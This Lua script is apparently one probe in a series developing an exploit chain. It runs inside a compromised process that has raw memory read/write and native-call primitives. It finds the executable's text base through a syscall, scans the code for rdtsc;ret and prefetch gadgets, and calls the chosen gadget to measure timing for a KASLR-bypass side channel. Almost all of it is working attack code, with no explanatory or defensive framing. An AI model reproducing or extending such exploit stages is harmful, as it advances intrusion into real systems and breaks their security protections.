-- CRASH_CLASS: LOW
-- PROBE 390b: Fast KASLR gadget scan using memory.read_buffer + string.find
--
-- Context: 390a timed out scanning 4.6MB dword-by-dword.
-- This uses read_buffer for bulk reads and string.find for C-speed pattern matching.
-- Looking for: rdtsc (0F 31), rdtscp (0F 01 F9), prefetch (0F 18), prefetchw (0F 0D)

print("=== PROBE 390b: fast KASLR gadget scan ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local function zero_buf(addr, len)
    for i = 0, len - 4, 4 do wd(N(addr) + i, 0) end
end

-- Get eboot base
local info = memory.alloc(0x200)
zero_buf(info, 0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)

local text_lo = rd(N(info) + 0x108)
local text_hi = rd(N(info) + 0x10C)
local text_size = rd(N(info) + 0x110) or 0x494000

print(string.format("eboot: 0x%X%08X size=0x%X", text_hi or 0, text_lo, text_size))

-- Test if read_buffer works
local test_rb = nil
local ok_rb, res_rb = pcall(function() return memory.read_buffer(text_lo, 16) end)
if ok_rb and type(res_rb) == "string" then
    test_rb = true
    print("read_buffer: OK (string, len=" .. #res_rb .. ")")
elseif ok_rb and type(res_rb) == "userdata" then
    test_rb = "userdata"
    print("read_buffer: returns userdata")
else
    test_rb = false
    print("read_buffer: " .. tostring(ok_rb) .. " / " .. type(res_rb or "nil"))
end
print("")

-- Pattern bytes (as Lua strings using string.char)
local pat_rdtsc = string.char(0x0F, 0x31)              -- rdtsc
local pat_rdtscp = string.char(0x0F, 0x01, 0xF9)       -- rdtscp
local pat_prefetch = string.char(0x0F, 0x18)            -- prefetch family
local pat_prefetchw = string.char(0x0F, 0x0D)           -- prefetchw
local pat_clflush = string.char(0x0F, 0xAE)             -- clflush family
local pat_lfence = string.char(0x0F, 0xAE, 0xE8)       -- lfence (useful for serializing)
local pat_mfence = string.char(0x0F, 0xAE, 0xF0)       -- mfence

if test_rb == true then
    -- ===============================================================
    -- FAST PATH: read_buffer returns string, use string.find
    -- ===============================================================
    print("[A] Fast scan via read_buffer")

    local CHUNK = 0x10000  -- 64KB chunks
    local rdtsc_list = {}
    local rdtscp_list = {}
    local prefetch_list = {}
    local prefetchw_list = {}
    local clflush_list = {}

    for base = 0, text_size - CHUNK, CHUNK do
        if not alive() then break end
        local addr = text_lo + base
        local ok, chunk = pcall(function() return memory.read_buffer(addr, CHUNK) end)
        if not ok or type(chunk) ~= "string" then break end

        -- Search for rdtsc
        local pos = 1
        while true do
            local found = string.find(chunk, pat_rdtsc, pos, true)
            if not found then break end
            rdtsc_list[#rdtsc_list + 1] = base + found - 1  -- offset in eboot
            pos = found + 1
        end

        -- Search for rdtscp
        pos = 1
        while true do
            local found = string.find(chunk, pat_rdtscp, pos, true)
            if not found then break end
            rdtscp_list[#rdtscp_list + 1] = base + found - 1
            pos = found + 1
        end

        -- Search for prefetch
        pos = 1
        while true do
            local found = string.find(chunk, pat_prefetch, pos, true)
            if not found then break end
            prefetch_list[#prefetch_list + 1] = base + found - 1
            pos = found + 1
        end

        -- Search for prefetchw
        pos = 1
        while true do
            local found = string.find(chunk, pat_prefetchw, pos, true)
            if not found then break end
            prefetchw_list[#prefetchw_list + 1] = base + found - 1
            pos = found + 1
        end

        -- Search for clflush
        pos = 1
        while true do
            local found = string.find(chunk, pat_clflush, pos, true)
            if not found then break end
            clflush_list[#clflush_list + 1] = base + found - 1
            pos = found + 1
        end
    end

    -- Also scan last partial chunk
    local remain = text_size % CHUNK
    if remain > 0 then
        local addr = text_lo + text_size - remain
        local ok, chunk = pcall(function() return memory.read_buffer(addr, remain) end)
        if ok and type(chunk) == "string" then
            local base = text_size - remain
            for _, found in ipairs({string.find(chunk, pat_rdtsc, 1, true)}) do
                if found then rdtsc_list[#rdtsc_list + 1] = base + found - 1 end
            end
        end
    end

    -- Report rdtsc hits with context
    print(string.format("  rdtsc hits: %d", #rdtsc_list))
    for i, off in ipairs(rdtsc_list) do
        if i <= 30 then
            -- Read surrounding bytes to check for ret (C3)
            local addr = text_lo + off
            local d0 = rd(addr)
            local d1 = rd(addr + 4)
            -- Check bytes after 0F 31 (at positions +2, +3, +4...)
            local bytes_after = {}
            if d0 then
                local b2 = math.floor(d0 / 65536) % 256
                local b3 = math.floor(d0 / 16777216)
                bytes_after[1] = b2
                bytes_after[2] = b3
            end
            if d1 then
                bytes_after[3] = d1 % 256
                bytes_after[4] = math.floor(d1 / 256) % 256
                bytes_after[5] = math.floor(d1 / 65536) % 256
            end

            local tag = ""
            for j, b in ipairs(bytes_after) do
                if b == 0xC3 then
                    if j == 1 then tag = " *** RDTSC;RET ***"
                    else tag = string.format(" (ret at +%d)", j + 1)
                    end
                    break
                end
            end
            print(string.format("    +0x%X: %08X %08X%s", off, d0 or 0, d1 or 0, tag))
        end
    end

    print(string.format("  rdtscp hits: %d", #rdtscp_list))
    for i, off in ipairs(rdtscp_list) do
        if i <= 10 then
            local addr = text_lo + off
            local d0 = rd(addr)
            local d1 = rd(addr + 4)
            local b_after = d1 and (d1 % 256) or 0
            local tag = b_after == 0xC3 and " *** RDTSCP;RET ***" or ""
            print(string.format("    +0x%X: %08X %08X%s", off, d0 or 0, d1 or 0, tag))
        end
    end

    print(string.format("  prefetch (0F18) hits: %d", #prefetch_list))
    for i, off in ipairs(prefetch_list) do
        if i <= 20 then
            local addr = text_lo + off
            local d0 = rd(addr)
            local d1 = rd(addr + 4)
            -- ModRM is byte after 0F 18 (byte 2 = bits 16-23 of d0)
            local modrm = d0 and math.floor(d0 / 65536) % 256 or 0
            local mod_f = math.floor(modrm / 64)
            local reg_f = math.floor(modrm / 8) % 8
            local rm = modrm % 8
            local regs = {"rax","rcx","rdx","rbx","sib","rip","rsi","rdi"}
            -- Check for ret after instruction
            local instr_len = 3
            if mod_f == 1 then instr_len = 4 end
            local tag = ""
            -- byte at offset instr_len from start
            if instr_len == 3 then
                local b3 = d0 and math.floor(d0 / 16777216) or 0
                if b3 == 0xC3 then tag = " *** +RET ***" end
            elseif instr_len == 4 then
                local b4 = d1 and (d1 % 256) or 0
                if b4 == 0xC3 then tag = " *** +RET ***" end
            end
            print(string.format("    +0x%X: modrm=%02X mod=%d /%d [%s]%s",
                off, modrm, mod_f, reg_f, regs[rm+1] or "?", tag))
        end
    end

    print(string.format("  prefetchw (0F0D) hits: %d", #prefetchw_list))
    for i, off in ipairs(prefetchw_list) do
        if i <= 10 then
            local addr = text_lo + off
            local d0 = rd(addr)
            local modrm = d0 and math.floor(d0 / 65536) % 256 or 0
            local mod_f = math.floor(modrm / 64)
            local rm = modrm % 8
            local regs = {"rax","rcx","rdx","rbx","sib","rip","rsi","rdi"}
            print(string.format("    +0x%X: modrm=%02X [%s]", off, modrm, regs[rm+1] or "?"))
        end
    end

    print(string.format("  clflush (0FAE) hits: %d", #clflush_list))

else
    -- ===============================================================
    -- SLOW PATH: dword-by-dword scan, simplified
    -- ===============================================================
    print("[A] Slow scan (no read_buffer)")
    print("  Scanning first 1MB only...")

    local scan_size = math.min(text_size, 0x100000)
    local rdtsc_count = 0
    local prefetch_count = 0

    for off = 0, scan_size - 8, 4 do
        local dw = rd(text_lo + off)
        if not dw then break end
        -- Quick check: low byte == 0x0F
        if dw % 256 == 0x0F then
            local b1 = math.floor(dw / 256) % 256
            if b1 == 0x31 then
                -- rdtsc at this offset
                local b2 = math.floor(dw / 65536) % 256
                local tag = b2 == 0xC3 and "*** RDTSC;RET ***" or ""
                print(string.format("  +0x%X: rdtsc %s", off, tag))
                rdtsc_count = rdtsc_count + 1
            elseif b1 == 0x18 or b1 == 0x0D then
                prefetch_count = prefetch_count + 1
                local b2 = math.floor(dw / 65536) % 256
                local b3 = math.floor(dw / 16777216)
                local tag = b3 == 0xC3 and "*** +RET ***" or ""
                if tag ~= "" then
                    print(string.format("  +0x%X: prefetch modrm=%02X %s", off, b2, tag))
                end
            end
        end
        -- Check byte 1 position
        local b1 = math.floor(dw / 256) % 256
        if b1 == 0x0F then
            local b2 = math.floor(dw / 65536) % 256
            if b2 == 0x31 then
                local b3 = math.floor(dw / 16777216)
                local tag = b3 == 0xC3 and "*** RDTSC;RET ***" or ""
                print(string.format("  +0x%X: rdtsc %s", off + 1, tag))
                rdtsc_count = rdtsc_count + 1
            end
        end
    end
    print(string.format("  rdtsc in 1MB: %d, prefetch: %d", rdtsc_count, prefetch_count))
end

if not alive() then print("DEAD"); return end
print("")

-- ===================================================================
-- [B] If usable gadget found, test rdtsc precision
-- ===================================================================
print("[B] rdtsc precision test")

-- Check if we found rdtsc;ret
local rdtsc_gadget = nil
if test_rb == true then
    -- Re-scan for rdtsc;ret specifically
    for off_idx = 1, math.min(#(rdtsc_list or {}), 30) do
        local off = rdtsc_list[off_idx]
        local addr = text_lo + off
        local d0 = rd(addr)
        if d0 then
            local b2 = math.floor(d0 / 65536) % 256
            if b2 == 0xC3 then
                rdtsc_gadget = addr
                print(string.format("  using rdtsc;ret at eboot+0x%X", off))
                break
            end
        end
    end
end

if rdtsc_gadget then
    -- Test basic precision
    local t1 = N(native.fcall_with_rax(uint64(rdtsc_gadget), 0))
    local t2 = N(native.fcall_with_rax(uint64(rdtsc_gadget), 0))
    print(string.format("  t1=%d t2=%d delta=%d", t1, t2, t2 - t1))

    -- Measure 20 back-to-back deltas
    local deltas = {}
    for i = 1, 20 do
        local a = N(native.fcall_with_rax(uint64(rdtsc_gadget), 0))
        local b = N(native.fcall_with_rax(uint64(rdtsc_gadget), 0))
        deltas[#deltas + 1] = b - a
    end
    local min_d, max_d, sum_d = deltas[1], deltas[1], 0
    for _, d in ipairs(deltas) do
        if d < min_d then min_d = d end
        if d > max_d then max_d = d end
        sum_d = sum_d + d
    end
    print(string.format("  20 samples: min=%d max=%d avg=%d", min_d, max_d, math.floor(sum_d / 20)))
else
    print("  no rdtsc;ret gadget — trying gettimeofday timing")
    -- Fall back to gettimeofday-based timing measurement
    local tv = memory.alloc(16)
    local sc_gtod = mk(116)
    zero_buf(tv, 16)
    pcall(function() sc_gtod(tv, uint64(0)) end)
    local usec1 = rd(N(tv) + 8) or 0
    -- Do 1000 iterations of something
    for i = 1, 1000 do N(native.fcall_with_rax(stub, 20)) end
    zero_buf(tv, 16)
    pcall(function() sc_gtod(tv, uint64(0)) end)
    local usec2 = rd(N(tv) + 8) or 0
    print(string.format("  1000 getpid calls: %d usec", usec2 - usec1))
end

if not alive() then print("DEAD"); return end
print("")

print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 390b COMPLETE ===")
